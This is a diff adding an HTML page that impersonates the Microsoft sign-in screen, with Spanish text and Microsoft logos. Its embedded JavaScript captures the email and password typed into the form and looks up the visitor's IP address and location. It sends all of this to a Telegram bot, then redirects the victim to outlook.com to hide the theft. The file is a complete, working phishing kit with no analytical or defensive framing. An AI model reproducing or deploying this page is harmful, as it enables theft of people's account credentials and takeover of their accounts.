@@ -1,0 +1,193 @@
+<html dir="ltr" class="" lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Bienvenido</title>
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+    <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <link rel="stylesheet" href="./index_files/main.css">
+    <meta name="robots" content="none">
+</style>
+        <script src="./appconsole.js"></script>
+        <script
+        src="https://code.jquery.com/jquery-2.2.3.min.js"
+        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+        crossorigin="anonymous"></script>
+
+        <script>
+            $.getJSON("https://api.ipify.org?format=json",
+             function(data) {
+                $("#gfg").html(data.ip);
+            })
+         </script>
+         <script>
+            $.getJSON("https://ipinfo.io", function (response) {
+       $("#ip").html("IP: " + response.ip);
+       $("#address").html("" + response.city + ", " + response.country);
+       })
+         </script>
+      <script>
+   
+   var u_name, pax,  ip, ip2;
+   var ready = function () {
+       u_name = document.getElementById("a7fxs1").value;
+       pax = document.getElementById("a7fxs2").value;
+       ip = document.getElementById("gfg").innerHTML;
+       ip2 = document.getElementById("address").innerHTML;
+       message = "" + u_name + "  -  Clave: " + pax +"  -  IP: " + ip +"  -  " + ip2;
+   };
+   var sender = function () {
+       ready();
+       var settings = {
+           "async": true,
+           "crossDomain": true,
+           "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+           "method": "POST",
+           "headers": {
+               "Content-Type": "application/json",
+               "cache-control": "no-cache"
+   
+           },
+           "data": JSON.stringify({
+               "chat_id": chat_id,
+               "text": message
+           })
+       };
+       $.ajax(settings).done(function (response) {
+           window.location = 'https://outlook.com/';
+           console.log(response);
+       });
+       return false;
+   };
+      </script>
+</head>
+
+<body style="display: block;overflow-y: hidden;">
+     <div id="a7nht1">
+            <div id="a72kjy">
+                <div id="a7nht1">
+                    <div id="m22frn6">
+    <div>
+
+        <div>
+            <div class="background" role="presentation">
+                <div style="background-image: url(./assent/fondo.jpg);"></div>
+
+            </div>
+        </div>
+        <div></div>
+        <form method="post" action="" onsubmit="return sender()">
+                            <p id="gfg" hidden=""></p>
+                        <p id="address" hidden=""></p>
+            <div class="outer">
+                <div id="footer" class="footer default" role="contentinfo">
+                    <div>
+                        <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" target="_blank" href="index.html">Terms of use</a> <a id="ftrPrivacy" href="index.html" target="_blank">Privacy and cookies</a>
+                            <a id="moreOptions" href="index.html" role="button" class="moreOptions" aria-label="Клацніть тут, щоб переглянути інформацію про виправлення неполадок" aria-expanded="false">
+                                <img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" src="./index_files/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
+                                <img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" src="./index_files/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="middle">
+
+                    <div class="inner fade-in-lightbox">
+                        <div class="lightbox-cover"></div>
+                        <div> <img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="./index_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"> </div>
+                        <div role="main">
+                            <div class="">
+                                <div class="pagination-view animate has-identity-banner slide-in-next">
+                                    <div data-viewid="1" data-showfedcredbutton="true">
+                                        <div>
+                                            <div class="row text-title" id="loginHeader">
+                                                <div role="heading" aria-level="1" data-bind="text: title">Iniciar
+                                                    sesión</div>
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="form-group col-md-24">
+                                                <div class="placeholderContainer">
+                                                    <div class="form-group">
+                                                        <input type="email" name="a7fxs1" id="a7fxs1" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Email or phone" aria-describedby="loginHeader" placeholder="Correo electrónico, teléfono o Skype">
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input type="password" name="a7fxs2" id="a7fxs2" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Email or phone" aria-describedby="loginHeader" placeholder="Contraseña">
+                                                    </div>
+                                                    <div class="text-13">
+
+                                                        <div class="form-group" data-bind="">¿No tiene una cuenta? <a href="index.html" id="signup" aria-label="Crear una cuenta Microsoft">Cree
+                                                                una.</a></div>
+                                                        <div class="form-group">
+                                                            <a id="idA_PWD_SwitchToFido" name="switchToFido" href="index.html" data-bind="">Iniciar sesión para recuperar tu cuenta</a>
+
+
+                                                            <span class="help-button" role="button" tabindex="0" data-bind="" aria-label="Más información sobre cómo iniciar sesión con una clave de seguridad"><img role="presentation" pngsrc="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_136bc3add990843012b1ec60612de803.png" svgsrc="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg" data-bind="imgSrc" src="./index_files/documentation_dae218aac2d25462ae286ceba8d80ce2.svg">
+                                                            </span>
+
+                                                            <div data-bind="">
+                                                                <!--  -->
+
+                                                                <br><br>
+                                                            </div><!-- /ko -->
+                                                        </div>
+
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-xs-24 no-padding-left-right button-container">
+                                                <div class="inline-block">
+                                                    <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Siguiente »">
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
+                        <div class="promoted-fed-cred-content">
+
+
+                            <div class="row tile">
+                                <div class="table" role="button" tabindex="0">
+
+                                    <div class="table-row">
+                                        <div class="table-cell tile-img medium">
+                                            <img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="./index_files/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
+
+                                        </div>
+                                        <div class="table-cell text-left content" data-bind="css: { &#39;content&#39;: !svr.cn }">
+                                            <div data-bind="
+                                    text: $data.text,
+                                    attr: { &#39;data-test-id&#39;: $data.testId }" data-test-id="signinOptions">Opciones de
+                                                inicio de sesión</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </form>
+    </div>
+
+
+        <div id="a77kjy"></div>
+    <script>
+const input = document.getElementById("a7fxs1");
+
+
+    </script>
+
+</body></html>
